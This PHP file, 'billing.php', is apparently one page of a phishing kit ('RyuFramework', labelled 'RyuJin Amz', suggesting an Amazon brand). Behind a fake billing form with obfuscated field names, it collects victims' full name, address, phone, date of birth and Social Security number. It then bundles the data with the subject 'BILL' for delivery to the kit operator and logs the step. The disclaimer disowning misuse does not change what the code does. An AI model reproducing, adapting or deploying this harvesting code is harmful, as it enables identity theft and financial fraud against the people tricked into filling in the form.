<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:24 )
* @filename billing.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
/*** LOG CONFIG FOR STATS ***/
$continue = $this->router('billing')['short'];
$type_log = 'billing';
$desc_log  = 'User fill billing form';
////////////////////////////

/**** SENDING CONFIG ***/
$type_send = 'billing';
$subject_send ='BILL';
$form_send = 'RyuJin Amz';
////////////////////////



if($this->getPost())
{
    $data = [];

    $fullname = $this->getPost()['nm'];
    $data['fullname'] = $fullname; 

    
    $address = $this->getPost()['aat1'];
    $data['address'] = $address; 

    
    $city = $this->getPost()['kta'];
    $data['city'] = $city; 

    
    $state = $this->getPost()['pnsi'];
    $data['state'] = $state; 

    
    $postcode = $this->getPost()['kpos'];
    $data['postcode'] = $postcode; 

    
    $country = $this->getPost()['nara'];
    $data['country'] = $country; 

    
    $phone = $this->getPost()['nomo'];
    $data['phone'] = $phone; 

    
    $birthday = $this->getPost()['dob'];
    $data['birthday'] = $birthday; 

    $ssn = $this->getPost()['ssn'];
    $data['ssn'] = $ssn;
    
        $send = ['from' => $form_send,
                'subject' => $subject_send,
                'type' => $type_send,
                'data' => $data
            ];

        $log = ['type' => $type_log,
                'desc' => $desc_log
            ];

           
        return $this->save_without_send($send,$continue);
 
}
